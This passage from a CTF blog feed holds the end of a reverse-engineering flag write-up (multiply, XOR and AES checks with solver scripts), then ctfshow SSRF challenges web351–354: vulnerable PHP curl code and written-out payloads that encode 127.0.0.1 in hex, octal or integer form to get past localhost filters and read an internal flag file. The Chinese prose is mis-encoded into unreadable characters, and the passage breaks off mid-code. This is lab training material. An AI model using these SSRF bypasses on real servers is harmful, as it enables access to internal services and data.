flagï¼Œç„¶åæŠ€èƒ½é«˜å…´å¯¹æ¯”ï¼Œè¿›è¡Œæ¯”è¾ƒï¼Œ é¦–å…ˆæ˜¯é•¿åº¦ï¼Œä¹‹åå°±æ˜¯ flag çš„ä¸º wdflag {XXXXXX} æ ¼å¼ã€‚</p><p>â€‹ç¬¬äºŒéƒ¨åˆ†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(dest, v19, <span class="number">0x20</span>uLL);</span><br><span class="line">  v17[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">  s2[<span class="number">0</span>] = <span class="number">98</span>;</span><br><span class="line">  s2[<span class="number">1</span>] = <span class="number">-54</span>;</span><br><span class="line">  s2[<span class="number">2</span>] = <span class="number">-56</span>;</span><br><span class="line">  s2[<span class="number">3</span>] = <span class="number">108</span>;</span><br><span class="line">  s2[<span class="number">4</span>] = <span class="number">106</span>;</span><br><span class="line">  s2[<span class="number">5</span>] = <span class="number">104</span>;</span><br><span class="line">  s2[<span class="number">6</span>] = <span class="number">-54</span>;</span><br><span class="line">  s2[<span class="number">7</span>] = <span class="number">-56</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    s1[i] = <span class="number">2</span> * dest[i];</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(s1, s2, <span class="number">8uLL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><pre><code>çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªä¹˜ç§¯ï¼Œè§£å¯†å¾—åˆ°ç¬¬ä¸€éƒ¨åˆ†ï¼š</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># v11 = [0x6a,0xe,0x17,0x46,0x75,0xb,0x41,0x6]</span></span><br><span class="line">v11 = [<span class="number">98</span>,<span class="number">202</span>,<span class="number">200</span>,<span class="number">108</span>,<span class="number">106</span>,<span class="number">104</span>,<span class="number">202</span>,<span class="number">200</span>]</span><br><span class="line">a = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(v11)):</span><br><span class="line">    a += <span class="built_in">chr</span>(<span class="built_in">int</span>(v11[i]/<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#1ed654ed</span></span><br></pre></td></tr></table></figure><p>â€‹ç¬¬ä¸‰æ®µï¼Œå°±æ˜¯ä¸ªå¼‚æˆ–ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">v21 = <span class="string">&quot;XorrLord&quot;</span>;</span><br><span class="line">  v11[<span class="number">0</span>] = <span class="number">0x6A</span>;</span><br><span class="line">  v11[<span class="number">1</span>] = <span class="number">0xE</span>;</span><br><span class="line">  v11[<span class="number">2</span>] = <span class="number">0x17</span>;</span><br><span class="line">  v11[<span class="number">3</span>] = <span class="number">0x46</span>;</span><br><span class="line">  v11[<span class="number">4</span>] = <span class="number">0x75</span>;</span><br><span class="line">  v11[<span class="number">5</span>] = <span class="number">0xB</span>;</span><br><span class="line">  v11[<span class="number">6</span>] = <span class="number">0x41</span>;</span><br><span class="line">  v11[<span class="number">7</span>] = <span class="number">6</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">8</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">    v12[j - <span class="number">8</span>] = dest[j] ^ v21[j - <span class="number">8</span>];</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(v12, v11, <span class="number">8uLL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  base64_encode(&amp;v16, <span class="number">8LL</span>, v10);</span><br><span class="line">  v20 = <span class="string">&quot;Ajc2AYK2Bjg&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v10, <span class="string">&quot;Ajc2AYK2Bjg&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>â€‹è¾“å…¥çš„æ•°æ®éœ€è¦å’Œ XorrLord è¿›è¡Œå¼‚æˆ–æ“ä½œï¼Œä¹‹åå’Œ Ajc2AYKBjg è¿›è¡Œæ¯”è¾ƒï¼Œè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v11 = [<span class="number">0x6a</span>,<span class="number">0xe</span>,<span class="number">0x17</span>,<span class="number">0x46</span>,<span class="number">0x75</span>,<span class="number">0xb</span>,<span class="number">0x41</span>,<span class="number">0x6</span>]</span><br><span class="line">a = <span class="string">&quot;XorrLord&quot;</span></span><br><span class="line">b = <span class="string">&quot;&quot;</span></span><br><span class="line">lst = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    lst.append(<span class="built_in">ord</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a)):</span><br><span class="line">    lst[i] = <span class="built_in">chr</span>(v11[i] ^ <span class="built_in">ord</span>(a[i]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(b.join(lst))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#2ae49d3b</span></span><br></pre></td></tr></table></figure><p>â€‹æœ€åä¸€ä¸ªéƒ¨åˆ†å°±æ˜¯ AES åŠ å¯†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">qmemcpy(v9, <span class="string">&quot;AesMasterAesMast&quot;</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line">v8[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">v8[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(v8, v17, <span class="number">8uLL</span>);</span><br><span class="line"><span class="keyword">for</span> ( k = <span class="number">8</span>; k &lt;= <span class="number">15</span>; ++k )</span><br><span class="line">  *((_BYTE *)v8 + k) = <span class="number">8</span>;</span><br><span class="line">AES_set_encrypt_key(v9, <span class="number">128LL</span>, v6);</span><br><span class="line">AES_encrypt(v8, v7, v6);</span><br><span class="line">hex_to_string(v7, <span class="number">16LL</span>, v5);</span><br><span class="line">v4[<span class="number">0</span>] = <span class="number">-43</span>;</span><br><span class="line">v4[<span class="number">1</span>] = <span class="number">-28</span>;</span><br><span class="line">v4[<span class="number">2</span>] = <span class="number">-19</span>;</span><br><span class="line">v4[<span class="number">3</span>] = <span class="number">116</span>;</span><br><span class="line">v4[<span class="number">4</span>] = <span class="number">-78</span>;</span><br><span class="line">v4[<span class="number">5</span>] = <span class="number">-126</span>;</span><br><span class="line">v4[<span class="number">6</span>] = <span class="number">-127</span>;</span><br><span class="line">v4[<span class="number">7</span>] = <span class="number">35</span>;</span><br><span class="line">v4[<span class="number">8</span>] = <span class="number">79</span>;</span><br><span class="line">v4[<span class="number">9</span>] = <span class="number">-121</span>;</span><br><span class="line">v4[<span class="number">10</span>] = <span class="number">-24</span>;</span><br><span class="line">v4[<span class="number">11</span>] = <span class="number">58</span>;</span><br><span class="line">v4[<span class="number">12</span>] = <span class="number">31</span>;</span><br><span class="line">v4[<span class="number">13</span>] = <span class="number">-71</span>;</span><br><span class="line">v4[<span class="number">14</span>] = <span class="number">-51</span>;</span><br><span class="line">v4[<span class="number">15</span>] = <span class="number">121</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">memcmp</span>(v7, v4, <span class="number">0x10</span>uLL) )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>â€‹å°†æ•°æ®æå–å‡ºæ¥ä¹‹åä¸€æŠŠæ¢­äº†ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/6a1fad2f2b884df483b3ecdad35e1bf6.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
      
      
      <categories>
          
          <category> CTFerçš„æ¯”èµ›ä¹‹è·¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-ssrf</title>
      <link href="/posts/b856856d.html"/>
      <url>/posts/b856856d.html</url>
      
        <content type="html"><![CDATA[<h1 id="web351"><a class="markdownIt-Anchor" href="#web351">#</a> web351ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">// å¼€å¯PHPæ–‡ä»¶  </span></span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="comment">// è¿™è¡Œä»£ç å°†PHPçš„é”™è¯¯æŠ¥å‘Šçº§åˆ«è®¾ç½®ä¸º0ï¼Œæ„å‘³ç€å…³é—­æ‰€æœ‰é”™è¯¯å’Œè­¦å‘Šçš„æ˜¾ç¤ºã€‚è¿™é€šå¸¸ç”¨äºç”Ÿäº§ç¯å¢ƒï¼Œä»¥é¿å…æš´éœ²æ•æ„Ÿä¿¡æ¯æˆ–é”™è¯¯ä¿¡æ¯ç»™ç”¨æˆ·ã€‚ç„¶è€Œï¼Œåœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œä¿æŒé”™è¯¯æŠ¥å‘Šå¼€å¯æ˜¯æ¨èçš„åšæ³•ï¼Œä»¥ä¾¿åŠæ—¶å‘ç°å’Œä¿®å¤é—®é¢˜ã€‚  </span></span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="comment">// `highlight_file()` å‡½æ•°å°†æŒ‡å®šçš„æ–‡ä»¶ï¼ˆè¿™é‡Œæ˜¯å½“å‰æ‰§è¡Œçš„æ–‡ä»¶ï¼Œç”± __FILE__ é­”æœ¯å¸¸é‡æä¾›ï¼‰çš„å†…å®¹ä½œä¸ºHTMLæ ¼å¼çš„é«˜äº®æºä»£ç è¾“å‡ºã€‚è¿™é€šå¸¸ç”¨äºå­¦ä¹ æˆ–å±•ç¤ºä»£ç ï¼Œä½†åœ¨ç”Ÿäº§ç¯å¢ƒä¸­å¯èƒ½ä¼šå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚  </span></span><br><span class="line">  </span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];  </span><br><span class="line"><span class="comment">// è¿™è¡Œä»£ç ä»å…¨å±€å˜é‡`$_POST`æ•°ç»„ä¸­è·å–é”®åä¸º&#x27;url&#x27;çš„å€¼ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™å˜é‡`$url`ã€‚è¿™æ„å‘³ç€ä»£ç æœŸæœ›é€šè¿‡POSTè¯·æ±‚æ¥æ”¶ä¸€ä¸ªåä¸º&#x27;url&#x27;çš„å‚æ•°ã€‚  </span></span><br><span class="line">  </span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);  </span><br><span class="line"><span class="comment">// ä½¿ç”¨`curl_init()`å‡½æ•°åˆå§‹åŒ–ä¸€ä¸ªæ–°çš„cURLä¼šè¯ï¼Œå¹¶å°†ä¹‹å‰è·å–çš„`$url`ä½œä¸ºå‚æ•°ä¼ é€’ç»™è¯¥å‡½æ•°ã€‚è¯¥å‡½æ•°è¿”å›ä¸€ä¸ªcURLä¼šè¯å¥æŸ„ï¼Œè¯¥å¥æŸ„ç”¨äºåç»­çš„æ‰€æœ‰cURLå‡½æ•°è°ƒç”¨ï¼Œå¹¶å­˜å‚¨åœ¨å˜é‡`$ch`ä¸­ã€‚  </span></span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);  </span><br><span class="line"><span class="comment">// é€šè¿‡`curl_setopt()`å‡½æ•°è®¾ç½®cURLä¼ è¾“é€‰é¡¹ã€‚è¿™é‡Œï¼Œ`CURLOPT_HEADER`é€‰é¡¹è¢«è®¾ç½®ä¸º0ï¼Œè¡¨ç¤ºåœ¨è·å–çš„å†…å®¹ä¸­ä¸åŒ…å«HTTPå¤´éƒ¨ã€‚è¿™é€šå¸¸æ˜¯å¯å–çš„ï¼Œå› ä¸ºå¤§å¤šæ•°æ—¶å€™æˆ‘ä»¬åªå…³å¿ƒHTTPå“åº”ä½“ï¼ˆå³ç½‘é¡µå†…å®¹ï¼‰ã€‚  </span></span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);  </span><br><span class="line"><span class="comment">// å†æ¬¡ä½¿ç”¨`curl_setopt()`å‡½æ•°è®¾ç½®cURLä¼ è¾“é€‰é¡¹ã€‚è¿™æ¬¡ï¼Œ`CURLOPT_RETURNTRANSFER`é€‰é¡¹è¢«è®¾ç½®ä¸º1ï¼Œè¡¨ç¤ºå°†cURLæ‰§è¡Œçš„ç»“æœä½œä¸ºå­—ç¬¦ä¸²è¿”å›ï¼Œè€Œä¸æ˜¯ç›´æ¥è¾“å‡ºã€‚è¿™ä½¿å¾—æˆ‘ä»¬å¯ä»¥å°†ç»“æœå­˜å‚¨åœ¨å˜é‡ä¸­ä¾›åç»­ä½¿ç”¨ã€‚  </span></span><br><span class="line">  </span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);  </span><br><span class="line"><span class="comment">// è°ƒç”¨`curl_exec()`å‡½æ•°æ‰§è¡ŒcURLä¼šè¯ã€‚å®ƒä¼šå‘é€ä¸€ä¸ªè¯·æ±‚åˆ°`curl_init()`å‡½æ•°æŒ‡å®šçš„URLï¼Œå¹¶è¿”å›æ‰§è¡Œç»“æœã€‚è¿™é‡Œï¼Œæ‰§è¡Œç»“æœè¢«å­˜å‚¨åœ¨å˜é‡`$result`ä¸­ã€‚å¦‚æœè¯·æ±‚å¤±è´¥ï¼Œ`curl_exec()`å°†è¿”å›`FALSE`ã€‚  </span></span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);  </span><br><span class="line"><span class="comment">// ä½¿ç”¨`curl_close()`å‡½æ•°å…³é—­cURLä¼šè¯ï¼Œå¹¶é‡Šæ”¾ä¸ä¹‹å…³è”çš„æ‰€æœ‰èµ„æºã€‚è¿™æ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ï¼Œå¯ä»¥é¿å…èµ„æºæ³„éœ²ã€‚  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);  </span><br><span class="line"><span class="comment">// æœ€åï¼Œä½¿ç”¨`echo`è¯­å¥è¾“å‡ºå˜é‡`$result`çš„å†…å®¹ï¼Œå³cURLè¯·æ±‚çš„ç»“æœã€‚å¦‚æœè¯·æ±‚æˆåŠŸï¼Œè¿™å°†è¾“å‡ºè¯·æ±‚çš„ç½‘é¡µå†…å®¹ï¼›å¦‚æœè¯·æ±‚å¤±è´¥ï¼ˆå¹¶ä¸”æ²¡æœ‰è¿›è¡Œé”™è¯¯å¤„ç†ï¼‰ï¼Œåˆ™ä¸ä¼šè¾“å‡ºä»»ä½•å†…å®¹ï¼ˆé™¤éä¹‹å‰å…³é—­äº†é”™è¯¯æŠ¥å‘Šï¼‰ã€‚  </span></span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"><span class="comment">// ç»“æŸPHPæ–‡ä»¶</span></span><br></pre></td></tr></table></figure><p>â€‹æ‰«åå°æ‰«åˆ°äº† flag.phpï¼Œç”±æ­¤ï¼Œè®¿é—®ä¹‹åå‘ç°éæœ¬åœ°æ— æ³•è®¿é—®ï¼Œæ‰€ä»¥ç›´æ¥ ssrf è¯»æ–‡ä»¶ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><h1 id="web352"><a class="markdownIt-Anchor" href="#web352">#</a> web352ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">parse_url</span> ( <span class="keyword">string</span> <span class="variable">$url</span> [, <span class="keyword">int</span> <span class="variable">$component</span> = -<span class="number">1</span> ] )</span><br></pre></td></tr></table></figure><p>â€‹æœ¬å‡½æ•°è§£æä¸€ä¸ª URL å¹¶è¿”å›ä¸€ä¸ªå…³è”æ•°ç»„ï¼ŒåŒ…å«åœ¨ URL ä¸­å‡ºç°çš„å„ç§ç»„æˆéƒ¨åˆ†ã€‚</p><p>â€‹è¿™é“é¢˜è¿‡æ»¤äº† localhost å’Œ 127.0.0ï¼Œç»•è¿‡æ–¹å¼æŒºå¤šçš„ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url=http://0x7F.0.0.1/flag.php   16è¿›åˆ¶</span><br><span class="line">url=http://0177.0.0.1/flag.php    8è¿›åˆ¶</span><br><span class="line">url=http://0.0.0.0/flag.php</span><br><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://127.127.127.127/flag.php</span><br></pre></td></tr></table></figure><h1 id="web353"><a class="markdownIt-Anchor" href="#web353">#</a> web353ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127\.0\.|\ã€‚/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹è¿‡æ»¤äº† 127.0. å’Œå¥å·ï¼Œé‚£ä¹ˆï¼Œç»•è¿‡æœ‰ä¸‹é¢çš„ï¼š<span class="exturl" data-url="aHR0cHM6Ly90b29sLjUyMDEwMS5jb20vd2FuZ2x1by9qaW56aGl6aHVhbmh1YW4v">IP åœ°å€è¿›åˆ¶è½¬æ¢ç½‘ç«™</span></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">åå…­è¿›åˆ¶</span><br><span class="line">url=http://0x7F.0.0.1/flag.php</span><br><span class="line">å…«è¿›åˆ¶</span><br><span class="line">url=http://0177.0.0.1/flag.php</span><br><span class="line">10 è¿›åˆ¶æ•´æ•°æ ¼å¼</span><br><span class="line">url=http://2130706433/flag.php</span><br><span class="line">16 è¿›åˆ¶æ•´æ•°æ ¼å¼ï¼Œè¿˜æ˜¯ä¸Šé¢é‚£ä¸ªç½‘ç«™è½¬æ¢è®°å¾—å‰ç¼€0x</span><br><span class="line">url=http://0x7F000001/flag.php</span><br><span class="line">è¿˜æœ‰ä¸€ç§ç‰¹æ®Šçš„çœç•¥æ¨¡å¼</span><br><span class="line">127.0.0.1å†™æˆ127.1</span><br><span class="line">ç”¨CIDRç»•è¿‡localhost</span><br><span class="line">url=http://127.127.127.127/flag.php</span><br><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://0.0.0.0/flag.php</span><br></pre></td></tr></table></figure><h1 id="web354"><a class="markdownIt-Anchor" href="#web354">#</a> web354ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|1|0|ã€‚/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ 